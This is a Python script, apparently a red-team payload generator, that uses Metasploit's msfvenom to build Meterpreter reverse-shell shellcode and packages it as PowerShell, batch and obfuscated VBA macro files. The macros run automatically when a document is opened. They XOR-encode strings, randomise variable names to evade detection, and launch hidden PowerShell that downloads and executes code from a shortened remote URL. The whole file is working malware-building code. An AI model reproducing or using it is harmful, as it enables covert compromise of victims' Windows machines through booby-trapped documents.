#!/usr/bin/env python

import os
import sys
import re
import subprocess
import urllib2
import string
import random
import hashlib
from optparse import OptionParser
from itertools import islice, imap, repeat, izip, cycle


def randstr(length=8):
    chars = set(
        string.ascii_uppercase
        + string.ascii_lowercase
        + string.digits
    )
    char_gen = (c for c in imap(os.urandom, repeat(1)) if c in chars)
    return ''.join(islice(char_gen, None, length))


def vbs_xor(data, key='default', maxlen=40):
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x, y) in izip(data, cycle(key)))
    i = 1
    out = ''
    for c in xored:
        if (i % maxlen) == 0:
            out += ' _\r\n'
        out += 'Chr(%d)&' % (ord(c))
        i += 1
    return out[:-1]


def find_in_path(file):
    for path in os.environ['PATH'].split(':'):
        if os.path.exists(path + '/' + file):
            return True
    return False


def validip(ip):
    if ip is None:
        return False
    r_octet = r'(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
    r_ip = r'^(%s\.){3}%s$' % (r_octet, r_octet)
    if re.match(r_ip, ip):
        return True
    return False


def oscmd(cmd, display=True):
    global t_rst, t_bold, t_red, t_green, t_blue
    stdout = ''
    stderr = ''
    if display:
        print '[*] %s%s%s' % (t_green, cmd, t_rst)
    try:
        proc = subprocess.Popen(
            cmd, shell=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        (stdout, stderr) = proc.communicate()
    except:
        raise
    return stdout, stderr


def parse_ports(pstr):
    if pstr is None:
        return []
    plist = []
    r_port = r'[0-9]{1,5}'
    r_mport = r'^(%s|(%s,){1,}%s)$' % (r_port, r_port, r_port)
    if not re.match(r_mport, pstr):
        return plist
    for p in pstr.split(','):
        if int(p) > 0 and int(p) < 65536:
            plist.append(int(p))
    return plist


def parse_payloads(pstr):
    plist = []
    if pstr is None:
        return [
            'windows/meterpreter/reverse_tcp',
            'windows/x64/meterpreter/reverse_tcp'
        ]
    for p in pstr.split(','):
        p = p.strip()
        if not re.match(r'^windows/.+/reverse_(tcp|http|https)$', p):
            error_exit('Invalid Payload Specified')
        plist.append(p)
    return plist


def fix_payload(p):
    out = ''
    p = re.sub(r'\r', '', p)
    for line in p.split('\n'):
        line = re.sub(r'^\$buf\s\+=\s', '', line)
        out = '%s,%s' % (out, line)
    return re.sub(r'^,\[Byte\[\]\]\s{0,1}\$buf\s{0,1}=\s{0,1}', '', out[:-1])


def gen_vbs_payload(p, maxstrlen=80):
    i = 0
    out = '"'
    lp = p.split(',')
    while i < len(lp):
        out += ','.join(lp[i:i + maxstrlen]) + '," _\r\n & "'
        i += maxstrlen
    return '%s"' % (out[:-10])


def get_invoke_shellcode():
    global URL_INVSC
    global URL_INVSC_MSIL
    global PSPLOIT_HOME
    global options
    global t_cyan, t_rst

    outcode = ''
    try:
        if options.msil:
            urldata = urllib2.urlopen(URL_INVSC_MSIL, None, 1)
            local_filename = '%s/Invoke-ShellcodeMSIL.ps1' % \
                (PSPLOIT_HOME)
        else:
            urldata = urllib2.urlopen(URL_INVSC, None, 1)
            local_filename = '%s/Invoke-Shellcode.ps1' % \
                (PSPLOIT_HOME)
        code = urldata.read()
    except Exception as e:
        print '[*] Warning: %sget_invoke_shellcode(): %s%s' % \
              (t_cyan, e, t_rst)
        print '[*] Warning: ' + \
            '%sReverting to Local Copy of Powershell script...%s' % \
            (t_cyan, t_rst)

        try:
            f = open(local_filename, 'r')
            code = f.read()
            f.close
        except:
            raise

    code = re.sub(r'\r', '', code)
    skip = False
    for line in code.split('\n'):
        if re.match(r'^<#', line):
            skip = True
        elif re.match(r'^#>', line):
            skip = False
            continue
        if skip:
            continue
        outcode = '%s%s\r\n' % (outcode, line)
        hash1 = hashlib.sha256(outcode).hexdigest()

    # cached script copy check
    if os.path.exists(local_filename):
        try:
            f = open(local_filename, 'r')
            hash2 = hashlib.sha256(f.read()).hexdigest()
            f.close()
        except:
            raise
    else:
        hash2 = ''

    # write cached copy of code to PSPLOIT_HOME dir
    if not hash1 == hash2:
        if hash2 == '':
            #print '[*] Creating cached copy of [%s]' % (local_filename)
            print '[*] building powershell...'
        else:
            #print '[*] Updating cached copy of [%s]' % (local_filename)
            print '[*] building powershell...'
        try:
            f = open(local_filename, 'w')
            f.write(outcode)
            f.close()
        except:
            raise
    return outcode


def make_filename(payload, lhost, lport):
    arch = 'x86'
    if re.match(r'^.+/x64/.+$', payload):
        arch = 'x64'

    desc = 'unknown'
    if re.match(r'^.+/meterpreter/.+$', payload):
        desc = 'meter'
    elif re.match(r'^.+/shell/.+$', payload):
        desc = 'shell'
    elif re.match(r'^.+/vnc/.+$', payload):
        desc = 'vnc'

    proto = 'tcp'
    if re.match(r'^.+/reverse_tcp$', payload):
        proto = 'rtcp'
    elif re.match(r'^.+/reverse_https$', payload):
        proto = 'rhttps'

    return 'ps-%s-%s-%s-%s%s' % (lhost, arch, desc, proto, lport)


def create_ps1bat_files(filename, payload, invoke_shellcode, url=None):
    global options
    arch_check = """\
@if defined PROGRAMFILES(X86) (\r
  echo [*] ERROR: Cannot run 32-bit injection on 64-bit system\r
  goto :END\r
)\r
"""
    cmd1 = 'powershell.exe -Command iex ' + \
        '(New-Object system.Net.WebClient)' + \
        '.DownloadString(\\\"%s\\\");' % (url)
    if options.msil:
        cmd2 = 'Invoke-ShellcodeMSIL -Shellcode %s\r\n' % (payload)
    else:
        cmd2 = 'Invoke-Shellcode -Force -Shellcode %s\r\n' % (payload)

    try:
        f = open('%s.bat' % filename, 'w')
        if re.match(r'^.+\-x64\-.+$', filename):
            f.write('%s%s:END\r\n' % (cmd1, cmd2))
        else:
            f.write('%s%s%s:END\r\n' % (arch_check, cmd1, cmd2))
        f.close()
    except:
        raise

    try:
        f = open('%s.ps1' % filename, 'w')
        f.write('%s%s' % (invoke_shellcode, cmd2))
        f.close()
    except:
        raise


def create_vbs_file(filename, vbs_payload, url=None, randomize=True):
    global options
    rv = random_vars(20)

    if options.msil:
        func = 'Invoke-ShellcodeMSIL -Shellcode '
    else:
        func = 'Invoke-Shellcode -Force -Shellcode '

    cmd = 'powershell.exe -Command iex ' + \
        '(New-Object system.Net.WebClient)' + \
        '.DownloadString(\\\"\"%s\\\"\");' % (url) + \
        func

    if randomize:
        key1 = randstr(64)
        key2 = randstr(64)
        sub1 = rv.pop()
        sub2 = rv.pop()
        r1 = rv.pop()
        r2 = rv.pop()
        r3 = rv.pop()
        r4 = rv.pop()
        r5 = rv.pop()
        r6 = rv.pop()
        r7 = rv.pop()
        r8 = rv.pop()
    else:
        key1 = 'KEY1_AAAA'
        key2 = 'KEY2_BBBB'
        sub1 = "ExecPowershell"
        sub2 = "XOREnc"
        r1 = "wshobj"
        r2 = "ps_payload"
        r3 = "X"
        r4 = "ps_cmd"
        r5 = "C"
        r6 = "inString"
        r7 = "pw"
        r8 = "L"

    # create XOR strings
    xor_wscript = vbs_xor('Wscript.Shell', key1)
    xor_pscmd = vbs_xor(cmd, key2)
    # xor_payload = vbs_xor(vbs_payload, key2)

    vba = """\
Sub %s()\r
  Dim %s: Set %s = CreateObject(%s(%s,\"%s\"))\r
  %s = %s\r
  %s = %s(%s,\"%s\") & %s\r
  %s.Run %s, 0, False\r
End Sub\r
Sub AutoOpen(): %s: End Sub\r
Sub Auto_Open(): %s: End Sub\r
Sub Workbook_Open(): %s: End Sub\r
\r
Private Function %s(ByVal %s As String, ByVal %s As String) As String\r
 Dim %s As Integer: Dim %s As Integer: Dim %s As String\r
 %s = Len(%s$)\r
 For %s = 1 To Len(%s)\r
   %s = Asc(Mid$(%s$, (%s Mod %s) - %s * ((%s Mod %s) = 0), 1))\r
   Mid$(%s, %s, 1) = Chr$(Asc(Mid$(%s, %s, 1)) Xor %s)\r
 Next\r
 %s = %s\r
End Function\r
""" % \
        (
            sub1,
            r1, r1, sub2, xor_wscript, key1,
            r2, vbs_payload,
            r4, sub2, xor_pscmd, key2, r2,
            r1, r4,
            sub1, sub1, sub1,
            #
            sub2, r6, r7,
            r8, r3, r5,
            r8, r7,
            r3, r6,
            r5, r7, r3, r8, r8, r3, r8,
            r6, r3, r6, r3, r5,
            sub2, r6
        )

    # write vbs file
    try:
        f = open('%s.vbs' % filename, 'w')
        f.write(vba)
        f.close()
    except:
        raise


def random_vars(n=10, length=20):
    i = 0
    retlist = []
    while i < n:
        mylen = random.randint(length / 2, length)
        s = randstr(mylen)
        if not re.match('^[0-9].+', s):
            retlist.append(s)
            i += 1
    return retlist


def error_exit(msg, with_banner=False):
    global BANNER
    global t_rst, t_bold, t_red, t_green, t_blue
    global parser
    if with_banner:
        print '%s\n[*] %sError: %s%s\n' % \
            (BANNER, t_red, msg, t_rst)
        parser.print_help()
    else:
        print '\n[*] %sError: %s%s' % \
            (t_red, msg, t_rst)
    sys.exit(1)


# main routine
if __name__ == '__main__':

    VERSION = '20150205_1212'

    AUTHOR = 'Joff Thyer'
    PSPLOIT_HOME = '%s/.psploit' % (os.path.expanduser('~'))

    URL_BASE = 'https://raw.githubusercontent.com/jsthyer/PowerSploit'
    URL_INVSC = URL_BASE + '/master/CodeExecution/Invoke--Shellcode.ps1'
    URL_INVSC_MSIL = URL_BASE + \
        '/master/CodeExecution/Invoke-ShellcodeMSIL.ps1'
    URL_INVSC_SHORT = 'https://goo.gl/11XkCQ'
    URL_INVSC_MSIL_SHORT = 'https://goo.gl/rPOVte'

    t_rst = '\x1b[0m'
    t_bold = '\x1b[1m'
    t_red = '\x1b[1;31m'
    t_green = '\x1b[1;32m'
    t_blue = '\x1b[1;34m'
    t_cyan = '\x1b[1;36m'

    BANNER = """ """
    USAGE = """ """


    if not find_in_path('msfvenom'):
        error_exit(
            'Metasploit \'msfvenom\' needs to be in your PATH',
            with_banner=True
        )

    parser = OptionParser()
    parser.add_option(
        '--lhost',
        help='specify LHOST for metasploit payloads'
    )
    parser.add_option(
        '--lport',
        help='specify LPORT for metasploit payloads'
    )
    parser.add_option(
        '--payload',
        help='Specify comma delimitered metasploit payloads.' + \
            'Default payloads are [%swindows/meterpreter/reverse_tcp%s]' % \
            (t_cyan, t_rst ) + \
            ' and [%swindows/x64/meterpreter/reverse_tcp%s]' % \
            (t_cyan, t_rst )
    )
    parser.add_option(
        '--norandvar',
        action='store_true', default=False,
        help='no random variable names and simple keys'
    )
    parser.add_option(
        '--msil',
        action='store_true', default=False,
        help='use non-Win32 API version of invoke-shellcode'
    )
    (options, args) = parser.parse_args()
    PORTS = parse_ports(options.lport)
    if not validip(options.lhost) or len(PORTS) == 0:
        error_exit('Invalid LHOST or LPORT parameters', with_banner=True)

    # psploit home dir?
    if not os.path.isdir(PSPLOIT_HOME):
        try:
            os.mkdir(PSPLOIT_HOME)
        except:
            raise

    # which powershell script?
    if options.msil:
        url_short = URL_INVSC_MSIL_SHORT
    else:
        url_short = URL_INVSC_SHORT

    # MAIN
    print BANNER
    PAYLOADS = parse_payloads(options.payload)
    payload_banner = ''
    for p in PAYLOADS:
        payload_banner += '\r\n[+]    %s%s%s' % (t_cyan, p, t_rst)
        print "[*] Building shellcode -> powershell language..."


    if 443 in PORTS:
        print '[*] Port 443 specified:\n' + \
            '[+]  Adding [%swindows/meterpreter/reverse_https%s]' % \
            (t_cyan, t_rst)
        print '[*]------------------------------------------'
        PAYLOADS.append('windows/meterpreter/reverse_https')

    try:
        ps_invoke_shellcode = get_invoke_shellcode()
    except Exception as e:
        error_exit(e)

    for port in PORTS:
        for payload in PAYLOADS:

            cmd = 'msfvenom -p %s LHOST=%s LPORT=%s EXITFUNC=thread -f powershell' \
                % (payload, options.lhost, port)
            stdout, stderr = oscmd(cmd)
            if re.match(r'^Invalid Payload.+$', stderr):
                error_exit('msfvenom [%s]' % (stderr[40:]))
            elif stdout == '' and len(stderr) > 0:
                error_exit('msfvenom [%s...(truncated)]' % (stderr[:200]))

            ps_payload = fix_payload(stdout)
            vbs_payload = gen_vbs_payload(ps_payload)
            base_filename = make_filename(payload, options.lhost, port)

            try:
                create_ps1bat_files(
                    base_filename,
                    ps_payload,
                    ps_invoke_shellcode,
                    url=url_short
                )
            except Exception as e:
                error_exit(e)

            if not re.match(r'.+x64.+', payload):
                try:
                    if options.norandvar:
                        create_vbs_file(
                            base_filename,
                            vbs_payload,
                            url=url_short,
                            randomize=False
                        )
                    else:
                        create_vbs_file(
                            base_filename,
                            vbs_payload,
                            url=url_short,
                            randomize=True
                        )
                except Exception as e:
                    error_exit(e)
